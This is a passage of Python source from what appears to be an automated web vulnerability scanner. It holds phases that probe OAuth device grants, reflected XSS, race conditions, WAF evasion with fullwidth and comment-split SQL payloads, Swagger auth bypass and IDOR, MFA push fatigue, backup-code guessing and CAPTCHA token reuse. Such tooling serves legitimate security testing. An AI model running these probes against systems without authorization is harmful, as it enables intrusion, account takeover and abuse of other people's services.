"""Advanced injection phases: OAuth device, DOM XSS, API race, WAF bypass, Swagger abuse, MFA bypass, CAPTCHA bypass, SSRF partial, Brotli oracle."""

import asyncio
import json
import re
import shlex
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional

from vulnforge.phases.helpers import (
    _SKIP_PARAMS,
    PhaseSet,
    _is_static_url,
)
from vulnforge.process import (
    _PIPELINE_CFG,
    _run,
)
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _extra_headers_dict,
    _get_urlopener,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)


async def phase_175_OAUTHDEVICE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"175-OAUTHDEVICE"}:
        return {}
    _out = outdir / "oauth_device.txt"
    if _out.exists() and not force:
        return {"175-OAUTHDEVICE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 175-OAUTHDEVICE: OAuth Device Grant pharming probes")
    findings: List[str] = []
    _od_urlopen = _get_urlopener()
    _od_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_cached
    ]
    if not targets:
        log("warn", "175-OAUTHDEVICE: no HTTP targets; skipping")
        return {"175-OAUTHDEVICE": str(_out), "count": 0}
    device_endpoints = [
        "/device",
        "/devicecode",
        "/oauth/device",
        "/oauth/device/code",
        "/device/code",
    ]

    async def _probe_device(host: str) -> List[str]:
        results: List[str] = []
        for ep in device_endpoints:
            url = host.rstrip("/") + ep
            try:
                req = urllib.request.Request(
                    url,
                    method="POST",
                    data=b"client_id=test&scope=openid",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        **_od_extra_headers,
                    },
                )
                status, headers, body = await _async_urlopen(_od_urlopen, req, timeout=10)
                body_str = body.decode("utf-8", errors="ignore") if body else ""
                if (
                    "user_code" in body_str
                    or "device_code" in body_str
                    or "verification_uri" in body_str
                ):
                    results.append(
                        f"[device-endpoint] {url} — HTTP {status} returns OAuth device fields"
                    )
                    # Rate limit check on user_code
                    for i in range(10):
                        try:
                            await _throttle_rate()
                            rl_req = urllib.request.Request(
                                url,
                                method="POST",
                                data=b"client_id=test&scope=openid",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    **_od_extra_headers,
                                },
                            )
                            rl_status, rl_headers, _ = await _async_urlopen(
                                _od_urlopen, rl_req, timeout=8
                            )
                            if rl_status in (429, 503):
                                results.append(
                                    f"[rate-limited] {url} — rate limited after {i + 1} rapid device code requests"
                                )
                                break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    else:
                        results.append(
                            f"[no-rate-limit] {url} — no rate limiting on device code generation after 10 requests"
                        )
                    # Check verification_uri spoofing
                    if "verification_uri" in body_str:
                        try:
                            ver_match = re.search(r'"verification_uri"\s*:\s*"([^"]+)"', body_str)
                            if not ver_match:
                                ver_match = re.search(
                                    r'"verification_uri"\s*:\s*"([^"]+)"', body_str
                                )
                            if ver_match:
                                ver_uri = ver_match.group(1)
                                if "evil" not in ver_uri.lower():
                                    results.append(
                                        f"[verification-uri] {url} — verification_uri={ver_uri}"
                                    )
                        except Exception:
                            pass
                    # Check polling without CSRF
                    if "device_code" in body_str:
                        try:
                            dc_match = re.search(r'"device_code"\s*:\s*"([^"]+)"', body_str)
                            if dc_match:
                                device_code = dc_match.group(1)
                                poll_url = url.replace(ep, "/oauth/token")
                                poll_data = f"grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code={device_code}&client_id=test"
                                poll_req = urllib.request.Request(
                                    poll_url,
                                    method="POST",
                                    data=poll_data.encode(),
                                    headers={
                                        "User-Agent": "Mozilla/5.0",
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        **_od_extra_headers,
                                    },
                                )
                                _, poll_headers, _ = await _async_urlopen(
                                    _od_urlopen, poll_req, timeout=8
                                )
                                poll_str = str(poll_headers).lower()
                                if (
                                    "x-csrf" not in poll_str
                                    and "csrf" not in poll_str
                                    and "state" not in poll_str
                                ):
                                    results.append(
                                        f"[no-csrf-poll] {url} — device code polling endpoint lacks CSRF/state parameter"
                                    )
                        except Exception:
                            pass
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    probe_results = await asyncio.gather(*[_probe_device(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[oauth-device] No OAuth Device Grant endpoints detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"175-OAUTHDEVICE: {len(findings)} device grant probes -> {out}")
    return {"175-OAUTHDEVICE": str(out), "count": len(findings)}


async def phase_177_SELENIUMXSS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"177-SELENIUMXSS"}:
        return {}
    _out = outdir / "dom_xss_dynamic.txt"
    if _out.exists() and not force:
        return {"177-SELENIUMXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 177-SELENIUMXSS: dynamic DOM XSS via event handler injection")
    findings: List[str] = []
    _sx_urlopen = _get_urlopener()
    _sx_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "177-SELENIUMXSS: no URLs; skipping")
        return {"177-SELENIUMXSS": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_redirect
    ]
    if not param_urls:
        log("warn", "177-SELENIUMXSS: no parameter URLs; skipping")
        return {"177-SELENIUMXSS": str(_out), "count": 0}
    event_handlers = [
        "onerror=alert(1)",
        "onload=alert(1)",
        "onclick=alert(1)",
        "onfocus=alert(1)",
        "onmouseover=alert(1)",
    ]

    async def _probe_xss(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for handler in event_handlers:
                await _throttle_rate()
                test_qs = qs.copy()
                for k in list(test_qs.keys()):
                    if k == param_name:
                        test_qs[k] = [handler.split("=")[1]]
                    else:
                        test_qs[k] = []
                full_test_qs = {}
                for k, vals in qs.items():
                    if k == param_name:
                        full_test_qs[k] = [handler]
                    else:
                        full_test_qs[k] = vals
                new_qs = urllib.parse.urlencode(full_test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_sx_extra_headers},
                    )
                    _, _, body = await _async_urlopen(_sx_urlopen, req, timeout=10)
                    body_str = body.decode("utf-8", errors="ignore") if body else ""
                    handler_name = handler.split("=")[0]
                    if handler_name in body_str.lower():
                        results.append(
                            f"[dom-xss-reflection] {test_url} — {handler_name} reflected in response body"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    xss_results = await asyncio.gather(*[_probe_xss(u) for u in param_urls])
    for xr in xss_results:
        findings.extend(xr)
    # Playwright browser DOM check
    if t.has("playwright") or t.has("chromium"):
        try:
            playwright_in = ensure(outdir / "playwright_xss_input.txt")
            playwright_in.write_text("\n".join(param_urls[:10]) + "\n")
            playwright_script = outdir / "logs" / "playwright_xss_check.py"
            ensure(playwright_script)
            playwright_script.write_text(
                "import asyncio, sys\n"
                "from playwright.async_api import async_playwright\n"
                "async def check(url):\n"
                "    async with async_playwright() as p:\n"
                "        browser = await p.chromium.launch()\n"
                "        page = await browser.new_page()\n"
                "        try:\n"
                "            await page.goto(url, timeout=10000)\n"
                "            alerts = []\n"
                "            page.on('dialog', lambda d: (alerts.append(d.message), d.accept()))\n"
                "            await asyncio.sleep(1)\n"
                "            if alerts:\n"
                "                print(f'[dom-xss-alert] {url} — browser triggered alert: {alerts}')\n"
                "        except Exception as e:\n"
                "            print(f'[playwright-error] {url} — {e}')\n"
                "        finally:\n"
                "            await browser.close()\n"
                "async def main():\n"
                "    urls = [l.strip() for l in sys.stdin if l.strip()]\n"
                "    await asyncio.gather(*[check(u) for u in urls])\n"
                "asyncio.run(main())\n"
            )
            pw_runner = outdir / "logs" / "playwright_xss_runner.sh"
            ensure(pw_runner)
            pw_runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"IN={shlex.quote(str(playwright_in))}\n"
                f"SCRIPT={shlex.quote(str(playwright_script))}\n"
                'cat "$IN" | python3 "$SCRIPT" 2>/dev/null\n'
            )
            pw_runner.chmod(0o700)
            await _run("playwright-xss", ["bash", str(pw_runner)], 300, outdir)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log("warn", f"177-SELENIUMXSS: playwright check failed: {e}")
    if not findings:
        findings.append("[dom-xss] No DOM-based XSS candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"177-SELENIUMXSS: {len(findings)} DOM XSS probes -> {out}")
    return {"177-SELENIUMXSS": str(out), "count": len(findings)}


async def phase_178_APIRACE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"178-APIRACE"}:
        return {}
    _out = outdir / "api_race.txt"
    if _out.exists() and not force:
        return {"178-APIRACE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 178-APIRACE: API race condition detection")
    findings: List[str] = []
    _ar_urlopen = _get_urlopener()
    _ar_extra_headers = _extra_headers_dict()
    urls: List[str] = prev.get("urls", []) or prev.get("params", [])
    if not urls:
        urls_file = outdir / "urls_all.txt"
        urls = read_lines(urls_file) if urls_file.exists() else []
    if not urls:
        log("warn", "178-APIRACE: no URLs; skipping")
        return {"178-APIRACE": str(_out), "count": 0}
    race_endpoints = [
        u
        for u in urls
        if any(
            m in u.lower()
            for m in (
                "/register",
                "/registration",
                "/signup",
                "/password-reset",
                "/reset-password",
                "/coupon",
                "/promo",
                "/discount",
                "/transfer",
                "/withdraw",
                "/deposit",
                "/api/register",
                "/api/signup",
                "/api/transfer",
                "/api/coupon",
                "/api/v1/register",
                "/api/v1/transfer",
                "/api/v2/register",
                "/api/v2/transfer",
                "/create",
                "/enroll",
                "/subscribe",
            )
        )
    ][:10]
    if not race_endpoints:
        race_endpoints = [u for u in urls if "=" in u and not _is_static_url(u)][:10]
    if not race_endpoints:
        log("warn", "178-APIRACE: no race-condition-prone endpoints; skipping")
        return {"178-APIRACE": str(_out), "count": 0}

    async def _race_test(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        base_status = None
        try:
            req = urllib.request.Request(
                url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_ar_extra_headers},
            )
            base_status, _, _ = await _async_urlopen(_ar_urlopen, req, timeout=10)
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

        async def _single_request() -> Optional[str]:
            try:
                race_data = b"race_test=1&timestamp=" + str(time.time()).encode()
                if parsed.query:
                    race_data = parsed.query.encode()
                req = urllib.request.Request(
                    url,
                    method="POST",
                    data=race_data,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        **_ar_extra_headers,
                    },
                )
                s, _, body_bytes = await _async_urlopen(_ar_urlopen, req, timeout=10)
                body_str = body_bytes.decode("utf-8", errors="ignore") if body_bytes else ""
                return body_str
            except asyncio.CancelledError:
                raise
            except Exception:
                return None

        bodies: List[str] = []
        concurrent_results = await asyncio.gather(*[_single_request() for _ in range(20)])
        for r in concurrent_results:
            if r:
                bodies.append(r)
        unique_bodies = set(bodies)
        if len(unique_bodies) > 1:
            results.append(
                f"[race-condition] {url} — {len(unique_bodies)} different responses from 20 concurrent POST requests"
            )
            for i, ub in enumerate(unique_bodies):
                preview = ub[:150].replace("\n", " ")
                results.append(f"  variant-{i}: {preview}")
        if len(unique_bodies) <= 1 and len(bodies) >= 20:
            results.append(
                f"[race-test-complete] {url} — consistent response across 20 concurrent requests (no race detected)"
            )
        return results

    race_results = await asyncio.gather(*[_race_test(u) for u in race_endpoints])
    for rr in race_results:
        findings.extend(rr)
    if not findings:
        findings.append("[api-race] No API race condition candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"178-APIRACE: {len(findings)} race probes -> {out}")
    return {"178-APIRACE": str(out), "count": len(findings)}


async def phase_179_WAFBYPASS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"179-WAFBYPASS"}:
        return {}
    _out = outdir / "waf_bypass_adv.txt"
    if _out.exists() and not force:
        return {"179-WAFBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 179-WAFBYPASS: advanced WAF bypass techniques")
    findings: List[str] = []
    _wb_urlopen = _get_urlopener()
    _wb_extra_headers = _extra_headers_dict()
    waf_findings: List[str] = prev.get("21-WAF", [])
    if not waf_findings:
        waf_file = outdir / "waf.txt"
        if waf_file.exists():
            waf_findings = read_lines(waf_file)
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls and not waf_findings:
        log("warn", "179-WAFBYPASS: no WAF data or URLs; skipping")
        return {"179-WAFBYPASS": str(_out), "count": 0}
    if waf_findings:
        findings.append(f"[waf-data] {len(waf_findings)} WAF findings loaded from previous phase")
        for wf in waf_findings[:5]:
            findings.append(f"  waf: {wf[:200]}")
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_redirect
    ]
    if not param_urls:
        log("warn", "179-WAFBYPASS: no parameter URLs for bypass testing; skipping")
        return {"179-WAFBYPASS": str(_out), "count": 0}
    fullwidth_payloads = [
        "\uff1c\uff33\uff43\uff52\uff49\uff50\uff54\uff1e",
        "\uff1c\uff33\uff43\uff52\uff49\uff50\uff54\uff1ealert(1)\uff1c/\uff33\uff43\uff52\uff49\uff50\uff54\uff1e",
        "\uff1c\uff29\uff4d\uff47 \uff33\uff52\uff43=http://evil.com/xss.jpg\uff1e",
    ]
    comment_payloads = [
        "/**/UN/**/ION/**/SE/**/LECT",
        "/**/SEL/**/ECT/**/1/**/FROM/**/dual",
        "ad/**/min",
        "/*!50000SELECT*/",
        "/*!UNION*/",
        "/*!50000UNION*//*!50000SELECT*/",
    ]
    bypass_url = param_urls[0]
    parsed = urllib.parse.urlparse(bypass_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if qs:
        test_param = next(iter(qs.keys()))
        if test_param.lower() not in _SKIP_PARAMS:
            for payload in fullwidth_payloads + comment_payloads:
                await _throttle_rate()
                test_qs = {}
                for k, vals in qs.items():
                    if k == test_param:
                        test_qs[k] = [payload]
                    else:
                        test_qs[k] = vals
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_wb_extra_headers},
                    )
                    _, _, body = await _async_urlopen(_wb_urlopen, req, timeout=10)
                    body_str = body.decode("utf-8", errors="ignore") if body else ""
                    response_len = len(body_str)
                    findings.append(
                        f"[waf-bypass-test] {test_url[:120]} — payload='{payload[:40]}' response_len={response_len}"
                    )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            # Chunked encoding test
            try:
                chunked_req = urllib.request.Request(
                    bypass_url,
                    method="GET",
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Transfer-Encoding": "chunked",
                        "TE": "chunked",
                        **_wb_extra_headers,
                    },
                )
                chunked_status, _, chunked_body = await _async_urlopen(
                    _wb_urlopen, chunked_req, timeout=10
                )
                chunked_str = chunked_body.decode("utf-8", errors="ignore") if chunked_body else ""
                findings.append(
                    f"[waf-bypass-chunked] {bypass_url[:100]} — HTTP {chunked_status} len={len(chunked_str)}"
                )
            except asyncio.CancelledError:
                raise
            except Exception:
                findings.append(
                    f"[waf-bypass-chunked] {bypass_url[:100]} — chunked encoding test completed (excepted)"
                )
    if not findings:
        findings.append("[waf-bypass] No WAF bypass candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"179-WAFBYPASS: {len(findings)} WAF bypass probes -> {out}")
    return {"179-WAFBYPASS": str(out), "count": len(findings)}


async def phase_180_SWAGGERABUSE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"180-SWAGGERABUSE"}:
        return {}
    _out = outdir / "swagger_abuse.txt"
    if _out.exists() and not force:
        return {"180-SWAGGERABUSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 180-SWAGGERABUSE: Swagger/OpenAPI abuse testing")
    findings: List[str] = []
    _sa_urlopen = _get_urlopener()
    _sa_extra_headers = _extra_headers_dict()
    api_specs: List[str] = prev.get("api_specs", [])
    if not api_specs:
        specs_file = outdir / "api_specs.txt"
        if specs_file.exists():
            api_specs = read_lines(specs_file)
    if not api_specs:
        urls_file = outdir / "urls_all.txt"
        all_urls = read_lines(urls_file) if urls_file.exists() else []
        api_endpoints = [
            u
            for u in all_urls
            if any(
                m in u.lower()
                for m in (
                    "/api/",
                    "/swagger",
                    "/openapi",
                    "/v1/",
                    "/v2/",
                    "/v3/",
                    ".json",
                    ".yaml",
                    ".yml",
                )
            )
        ][:20]
        if api_endpoints:
            api_specs = api_endpoints
    if not api_specs:
        log("warn", "180-SWAGGERABUSE: no API specs or endpoints; skipping")
        return {"180-SWAGGERABUSE": str(_out), "count": 0}
    findings.append(f"[api-specs] {len(api_specs)} API endpoints/specs loaded")

    async def _abuse_endpoint(spec_url: str) -> List[str]:
        results: List[str] = []
        endpoints_to_test = [spec_url]
        try:
            req = urllib.request.Request(
                spec_url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_sa_extra_headers},
            )
            s_status, _, s_body = await _async_urlopen(_sa_urlopen, req, timeout=10)
            body_str = s_body.decode("utf-8", errors="ignore") if s_body else ""
            # Try to parse as JSON to extract paths
            if body_str.strip().startswith("{"):
                try:
                    spec_json = json.loads(body_str)
                    if "paths" in spec_json:
                        for path in spec_json["paths"]:
                            base_url = (
                                spec_url.rstrip("/").rsplit("/", 1)[0]
                                if any(ext in spec_url for ext in (".json", ".yaml", ".yml"))
                                else spec_url.rstrip("/")
                            )
                            ep = base_url + path
                            endpoints_to_test.append(ep)
                except (json.JSONDecodeError, TypeError):
                    pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        for ep in endpoints_to_test[:15]:
            try:
                if "?" in ep:
                    ep_base = ep.split("?")[0]
                else:
                    ep_base = ep
                # Auth bypass
                noauth_req = urllib.request.Request(
                    ep_base,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_sa_extra_headers},
                )
                na_status, na_headers, na_body = await _async_urlopen(
                    _sa_urlopen, noauth_req, timeout=10
                )
                body_lower = na_body.decode("utf-8", errors="ignore").lower() if na_body else ""
                if (
                    na_status == 200
                    and "unauthorized" not in body_lower
                    and "forbidden" not in body_lower
                ):
                    results.append(
                        f"[auth-bypass] {ep_base} — HTTP {na_status} without auth header returns data"
                    )
                # Input fuzzing
                fuzz_payload = "A" * 10000 + "<script>alert(1)</script>"
                if "?" in ep:
                    fuzz_url = ep + "&input=" + urllib.parse.quote(fuzz_payload)
                else:
                    fuzz_url = ep + "?input=" + urllib.parse.quote(fuzz_payload)
                fuzz_req = urllib.request.Request(
                    fuzz_url,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_sa_extra_headers},
                )
                fuzz_status, _, fuzz_body = await _async_urlopen(_sa_urlopen, fuzz_req, timeout=10)
                fuzz_str = fuzz_body.decode("utf-8", errors="ignore") if fuzz_body else ""
                if fuzz_status == 500 or "error" in fuzz_str.lower():
                    results.append(
                        f"[input-fuzz] {ep_base[:100]} — large input caused HTTP {fuzz_status}"
                    )
                # IDOR probe on path params
                path_parts = ep_base.rstrip("/").split("/")
                for pi, pp in enumerate(path_parts):
                    if pp.isdigit():
                        idor_path = "/".join(path_parts[:pi] + ["1"] + path_parts[pi + 1 :])
                        idor_req = urllib.request.Request(
                            idor_path,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_sa_extra_headers},
                        )
                        idor_status, _, idor_body = await _async_urlopen(
                            _sa_urlopen, idor_req, timeout=10
                        )
                        idor_str = idor_body.decode("utf-8", errors="ignore") if idor_body else ""
                        if (
                            idor_status == 200
                            and idor_str
                            and "error" not in idor_str.lower()[:100]
                        ):
                            results.append(
                                f"[idor-candidate] {idor_path} — HTTP {idor_status} with replaced path param"
                            )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    abuse_results = await asyncio.gather(*[_abuse_endpoint(s) for s in api_specs[:10]])
    for ar in abuse_results:
        findings.extend(ar)
    if not findings:
        findings.append("[swagger-abuse] No Swagger abuse candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"180-SWAGGERABUSE: {len(findings)} Swagger abuse probes -> {out}")
    return {"180-SWAGGERABUSE": str(out), "count": len(findings)}


async def phase_181_MFABYPASS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"181-MFABYPASS"}:
        return {}
    _out = outdir / "mfa_bypass.txt"
    if _out.exists() and not force:
        return {"181-MFABYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 181-MFABYPASS: advanced MFA bypass testing")
    findings: List[str] = []
    _mb_urlopen = _get_urlopener()
    _mb_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_cached
    ]
    if not targets:
        log("warn", "181-MFABYPASS: no HTTP targets; skipping")
        return {"181-MFABYPASS": str(_out), "count": 0}
    mfa_endpoints = [
        "/mfa",
        "/2fa",
        "/multifactor",
        "/auth/mfa",
        "/auth/2fa",
        "/api/mfa",
        "/api/2fa",
        "/verify",
        "/auth/verify",
        "/enroll-mfa",
        "/mfa/enroll",
        "/2fa/enroll",
    ]

    async def _probe_mfa(host: str) -> List[str]:
        results: List[str] = []
        for ep in mfa_endpoints:
            url = host.rstrip("/") + ep
            try:
                req = urllib.request.Request(
                    url,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_mb_extra_headers},
                )
                status, headers, body = await _async_urlopen(_mb_urlopen, req, timeout=10)
                body_str = body.decode("utf-8", errors="ignore") if body else ""
                if status == 200:
                    results.append(f"[mfa-endpoint] {url} — HTTP {status} MFA endpoint accessible")
                    # MFA fatigue: rapid push notification requests
                    if "push" in body_str.lower() or "approve" in body_str.lower():
                        for i in range(10):
                            try:
                                await _throttle_rate()
                                push_data = b"action=approve&device=device1"
                                push_req = urllib.request.Request(
                                    url,
                                    method="POST",
                                    data=push_data,
                                    headers={
                                        "User-Agent": "Mozilla/5.0",
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        **_mb_extra_headers,
                                    },
                                )
                                push_status, _, _ = await _async_urlopen(
                                    _mb_urlopen, push_req, timeout=8
                                )
                                if push_status in (429, 503):
                                    results.append(
                                        f"[mfa-rate-limited] {url} — rate limited after {i + 1} push requests"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                        else:
                            results.append(
                                f"[mfa-fatigue] {url} — no rate limiting on push approval after 10 rapid requests"
                            )

                    # Device enrollment race
                    async def _enroll_device(dev_id: str) -> Optional[int]:
                        try:
                            enroll_data = f"device_id={dev_id}&name=test_device".encode()
                            enroll_req = urllib.request.Request(
                                url.replace("/mfa", "/mfa/enroll").replace("/2fa", "/2fa/enroll"),
                                method="POST",
                                data=enroll_data,
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    **_mb_extra_headers,
                                },
                            )
                            s, _, _ = await _async_urlopen(_mb_urlopen, enroll_req, timeout=8)
                            return s
                        except Exception:
                            return None

                    enroll_results = await asyncio.gather(
                        *[_enroll_device(f"device_{i}") for i in range(5)]
                    )
                    success_enrolls = [r for r in enroll_results if r == 200]
                    if len(success_enrolls) > 1:
                        results.append(
                            f"[device-enroll-race] {url} — {len(success_enrolls)} devices enrolled concurrently (race condition)"
                        )
                    # OTP timing attack
                    timing_samples: List[float] = []
                    for _ in range(5):
                        start = time.time()
                        try:
                            otp_data = b"code=123456&token=test"
                            otp_req = urllib.request.Request(
                                url,
                                method="POST",
                                data=otp_data,
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    **_mb_extra_headers,
                                },
                            )
                            _, _, _ = await _async_urlopen(_mb_urlopen, otp_req, timeout=8)
                        except Exception:
                            pass
                        elapsed = time.time() - start
                        timing_samples.append(elapsed)
                    if len(timing_samples) >= 3:
                        avg_time = sum(timing_samples) / len(timing_samples)
                        if avg_time > 0.5:
                            results.append(
                                f"[otp-timing] {url} — avg response time {avg_time:.3f}s, potential timing oracle"
                            )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        # Backup code brute-force test
        backup_url = host.rstrip("/") + "/mfa/backup"
        try:
            for code in range(0, 100000, 10000):
                code_str = f"{code:06d}"
                await _throttle_rate()
                bc_data = f"backup_code={code_str}".encode()
                bc_req = urllib.request.Request(
                    backup_url,
                    method="POST",
                    data=bc_data,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        **_mb_extra_headers,
                    },
                )
                bc_status, _, _ = await _async_urlopen(_mb_urlopen, bc_req, timeout=8)
                if bc_status == 429:
                    results.append(
                        f"[backup-code-rate-limited] {backup_url} — rate limited at backup code {code_str}"
                    )
                    break
                if bc_status == 200:
                    results.append(
                        f"[backup-code-candidate] {backup_url} — HTTP {bc_status} with code {code_str}"
                    )
            else:
                results.append(
                    f"[backup-code-no-rate-limit] {backup_url} — no rate limiting on backup codes (sample tested)"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return results

    probe_results = await asyncio.gather(*[_probe_mfa(t) for t in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[mfa-bypass] No MFA bypass candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"181-MFABYPASS: {len(findings)} MFA probes -> {out}")
    return {"181-MFABYPASS": str(out), "count": len(findings)}


async def phase_182_CAPTCHABYPASS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"182-CAPTCHABYPASS"}:
        return {}
    _out = outdir / "captcha_bypass.txt"
    if _out.exists() and not force:
        return {"182-CAPTCHABYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 182-CAPTCHABYPASS: CAPTCHA bypass testing")
    findings: List[str] = []
    _cb_urlopen = _get_urlopener()
    _cb_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "182-CAPTCHABYPASS: no URLs; skipping")
        return {"182-CAPTCHABYPASS": str(_out), "count": 0}
    captcha_endpoints = [
        u
        for u in all_urls
        if any(
            m in u.lower()
            for m in (
                "captcha",
                "recaptcha",
                "g-recaptcha",
                "h-captcha",
                "turnstile",
                "challenge",
                "verify",
            )
        )
    ][:15]
    if not captcha_endpoints:
        login_urls = [
            u
            for u in all_urls
            if any(m in u.lower() for m in ("/login", "/signin", "/auth", "/register", "/signup"))
        ][:10]
        if login_urls:
            captcha_endpoints = login_urls
    if not captcha_endpoints:
        log("warn", "182-CAPTCHABYPASS: no CAPTCHA-related endpoints; skipping")
        return {"182-CAPTCHABYPASS": str(_out), "count": 0}

    async def _probe_captcha(url: str) -> List[str]:
        results: List[str] = []
        # CAPTCHA response reuse: same token multiple times
        try:
            token_data = b"g-recaptcha-response=test_token&action=submit"
            for i in range(3):
                reuse_req = urllib.request.Request(
                    url,
                    method="POST",
                    data=token_data,
                    headers={
                        "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        **_cb_extra_headers,
                    },
                )
                s, _, b = await _async_urlopen(_cb_urlopen, reuse_req, timeout=10)
                body_str = b.decode("utf-8", errors="ignore") if b else ""
                if (
                    "invalid" not in body_str.lower()
                    and "error" not in body_str.lower()
                    and s == 200
                ):
                    results.append(
                        f"[captcha-reuse] {url} — same captcha token accepted {i + 1} times (HTTP {s})"
                    )
                    break
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        # Missing CAPTCHA on sub-actions
        try:
            no_captcha_data = b"action=submit"
